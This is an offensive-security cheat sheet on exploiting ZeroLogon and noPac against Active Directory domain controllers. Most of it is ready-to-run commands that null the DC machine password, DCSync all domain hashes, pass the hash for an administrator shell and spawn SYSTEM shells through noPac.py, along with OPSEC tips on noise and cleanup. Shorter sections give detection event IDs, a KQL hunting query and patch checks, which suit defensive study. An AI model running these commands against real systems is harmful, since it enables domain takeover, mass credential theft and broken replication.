# ZeroLogon & noPac

Critical-severity vulnerabilities in the Netlogon and Kerberos protocols allowing privilege escalation to Domain Admin.

## ZeroLogon (CVE-2020-1472)

**CVSS: 10.0** — Critical elevation of privilege in Netlogon protocol.

A cryptographic flaw in the Netlogon authentication scheme (AES-CFB8) allows an attacker to impersonate any computer (including the Domain Controller) by setting the computed session key to zero.

### How It Works

```
Attacker ──► Netlogon RPC call (NetrServerReqChallenge)
  ──► Sends 16 zero bytes as challenge credential
  ──► Netlogon accepts due to AES-CFB8 zero initialization vector bug
Attacker now has Domain Controller machine account credentials
  ──► secretsdump.py -just-dc -no-pass = DCSync as DC itself
```

### Prerequisites

- Network connectivity to Domain Controller (TCP/445)
- No credentials required
- DC must be vulnerable (patched Aug 2020 and later would need /force)

### Linux — ZeroLogon Scanner & Exploitation

#### Check if vulnerable with NetExec
```bash
nxc smb 10.10.10.10 -u '' -p '' -M zerologon
```
Look for: `VULNERABLE` or `NOT VULNERABLE`

#### Exploit with impacket zerologon.py
```bash
# Original PoC
python3 zerologon.py -target DC01 10.10.10.10
```

#### Automated exploitation with secretsdump
```bash
# Set DC machine account password to empty, then DCSync
python3 zerologon.py DC01 10.10.10.10

# Dump hashes (no password needed since password is now empty)
secretsdump.py -just-dc -no-pass 'DOMAIN/DC01$@10.10.10.10'
```

#### One-liner exploitation
```bash
python3 zerologon.py DC01 10.10.10.10 && secretsdump.py -just-dc -no-pass 'domain/DC01$@10.10.10.10'
```

#### Restore original password (critical!)
```bash
# If you captured the original hash, restore it:
python3 reinstall_original_pw.py DC01 10.10.10.10 <original_hash>
```

### Full ZeroLogon Attack Flow

```
1. Check if DC is vulnerable
   netexec smb 10.10.10.10 -u '' -p '' -M zerologon

2. Exploit: Null the DC machine account password
   python3 zerologon.py DC01 10.10.10.10

3. DCSync as the DC machine account
   secretsdump.py -just-dc -no-pass 'domain/DC01$@10.10.10.10' -outputfile domain_hashes

4. Extract domain admin hash
   grep -i administrator domain_hashes.ntds

5. Pass-the-hash to get DA shell
   netexec smb 10.10.10.10 -u 'administrator' -H <NT_HASH> -x 'whoami'
   impacket-psexec 'domain/administrator@10.10.10.10' -hashes :<NT_HASH>

6. Restore original DC machine account password (if saved)
   python3 reinstall_original_pw.py DC01 10.10.10.10 <original_hash>
```

### Windows Detection (ZeroLogon)

**Event Logs:**
- **Event ID 5827** — Netlogon client denied (after patch)
- **Event ID 5828** — Netlogon client allowed but with security mitigation bypass
- **Event ID 5805** — Netlogon session setup failure
- **Event ID 5830** — Netlogon session with privileged account

**Indicators:**
- Excessive `NetrServerReqChallenge` calls (thousands per second)
- 2560 zero-byte challenge attempts per exploit run
- Source is not a domain-joined machine
- Anomalous DC-to-DC replication initiated from rogue IP

## noPac (CVE-2021-42278 / CVE-2021-42287)

**CVSS: 8.8** — SamAccountName spoofing + Kerberos PAC confusion chain.

### How It Works

```
Step 1: Create machine account with trailing $ (like domain controller)
  ──► sAMAccountName: DC01 (no trailing $)

Step 2: Request TGT for this account
  ──► KDC sees sAMAccountName: DC01, issues TGT

Step 3: Rename machine account to different name
  ──► sAMAccountName: RENAMED (remove the DC01 name)

Step 4: Request S4U2self TGS using TGT → KDC can't find account
  ──► KDC re-issues TGT (CVE-2021-42287)
  ──► KDC looks up account by old name, finds REAL DC01
  ──► Issues TGS as Domain Controller = Domain Admin access!
```

### Prerequisites

- Valid domain credentials (any domain user)
- Ability to create machine accounts (default: 10 per user)
- Unpatched DC (patch: Nov 2021)

### Linux — noPac Exploitation

#### Check vulnerability
```bash
nxc smb 10.10.10.10 -u 'user' -p 'pass' -M nopac
```

#### Exploit with impacket (noPac.py)
```bash
# Basic exploit
python3 noPac.py domain.local/user:pass -dc-ip 10.10.10.10 -dc-host DC01 -shell

# With hash instead of password
python3 noPac.py domain.local/user -hashes :<NTHASH> -dc-ip 10.10.10.10 -dc-host DC01 -shell

# Impersonate specific user
python3 noPac.py domain.local/user:pass -dc-ip 10.10.10.10 -dc-host DC01 -impersonate administrator -shell

# Dump hashes via noPac
python3 noPac.py domain.local/user:pass -dc-ip 10.10.10.10 -dc-host DC01 -dump -just-dc
```

#### Using NetExec noPac
```bash
nxc smb 10.10.10.10 -u 'user' -p 'pass' -M nopac -o 'action=shell'
```

### Full noPac Attack Flow

```
1. Check if vulnerable
   netexec smb 10.10.10.10 -u 'domain_user' -p 'pass' -M nopac

2. Exploit to get SYSTEM shell on DC (if vulnerable)
   python3 noPac.py domain.local/domain_user:pass -dc-ip 10.10.10.10 -dc-host DC01 -shell

3. Dump all domain hashes
   python3 noPac.py domain.local/domain_user:pass -dc-ip 10.10.10.10 -dc-host DC01 -dump

4. Pass-the-hash to authenticate as DA anywhere
   netexec smb 10.10.10.10 -u 'administrator' -H <DA_NT_HASH> -x 'whoami'
```

## sam-the-admin (Same vuln, different PoC)

```bash
# Alternative PoC
python3 sam-the-admin.py domain.local/user:pass -dc-ip 10.10.10.10 -shell
```

## Detection & Signatures

**noPac Event Logs:**
- **Event ID 4742** — Computer account changed (renamed)
- **Event ID 4627** — Group membership information
- **Event ID 4672** — Special privileges assigned to new logon
- **Event ID 4738** — User account changed (sAMAccountName modification)

**Indicators:**
- Computer account rapidly created and renamed
- sAMAccountName matching a Domain Controller name
- TGS request with PAC referencing different account than sAMAccountName
- Machine account created and deleted in quick succession

**Hunting Query (KQL):**
```
EventID: 4742
| where SamAccountName contains "DC"  // suspicious rename
| where TimeGenerated between (now(-5m) .. now())
| summarize count() by TargetAccount, SubjectAccount
| where count_ > 1
```

## OPSEC Considerations

**ZeroLogon:**
- **Extremely destabilizing** — Nulling DC password breaks replication; RESTORE IT
- **Very noisy** — Thousands of RPC calls in seconds; EDR will catch
- **Post-patch DCs** — Requires `-force` flag which changes approach
- **Restoration critical** — If you don't restore, domain breaks permanently
- **Don't run in production** — Can crash DC if improperly handled

**noPac:**
- **Less noisy** — Uses standard Kerberos + LDAP operations
- **Leaves artifacts** — Created/renamed machine accounts in AD
- **Authenticated required** — Not usable without valid creds
- **Clean up account** — Delete created machine account after exploitation

## Defenses

| Vulnerability | Patch | Workaround |
|---------------|-------|------------|
| ZeroLogon | August 2020 update | Enable "Domain controller: Allow vulnerable Netlogon secure channel connections" = No |
| noPac | November 2021 update | Enforce Kerberos PAC validation |
| sam-the-admin | November 2021 update | Same as noPac |

**Post-Exploitation Verification:**
```powershell
# Check ZeroLogon patch
Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Services\Netlogon\Parameters" | Select RequireSignOrSeal, RequireStrongKey

# Check noPac patch
Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Services\Kdc\Parameters" | Select AdditionalPacValidationRequired
```

## References

- ZeroLogon PoC (Secura): https://github.com/SecuraBV/CVE-2020-1472
- CVE-2020-1472: Microsoft Netlogon Elevation of Privilege
- noPac (noPac.py): https://github.com/Ridter/noPac
- CVE-2021-42278: Active Directory sAMAccountName spoofing
- CVE-2021-42287: Kerberos KDC bypass
- sam-the-admin: https://github.com/WazeHell/sam-the-admin
- NetExec: https://github.com/Pennyw0rth/NetExec
